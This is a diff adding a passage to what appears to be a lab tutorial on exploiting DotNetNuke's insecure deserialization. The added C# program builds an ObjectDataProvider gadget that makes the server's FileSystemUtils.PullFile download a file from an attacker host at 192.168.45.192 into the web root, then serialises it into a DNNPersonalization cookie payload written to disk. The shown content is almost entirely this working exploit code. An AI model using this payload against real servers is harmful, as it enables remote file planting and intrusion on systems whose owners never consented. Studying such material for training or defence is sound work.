@@ -206,3 +206,37 @@ public static string SerializeDictionary(IDictionary source, string rootName)
 }
 
 ```
+With that in mind, we will adjust our application source code to look like the following:
+```c#
+using System;
+using System.IO;
+using System.Xml.Serialization;
+using DotNetNuke.Common.Utilities;
+using System.Windows.Data;
+using System.Collections;
+
+namespace ODPSerializer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            ObjectDataProvider myODP = new ObjectDataProvider();
+            myODP.ObjectInstance = new FileSystemUtils();
+            myODP.MethodName = "PullFile";
+            myODP.MethodParameters.Add("http://192.168.45.192/myODPTest.txt");
+            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
+
+            Hashtable table = new Hashtable();
+            table["myTableEntry"] = myODP;
+            String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
+            TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
+            writer.Write(payload);
+            writer.Close();
+
+            Console.WriteLine("Done!");
+        }
+    }
+}
+
+```
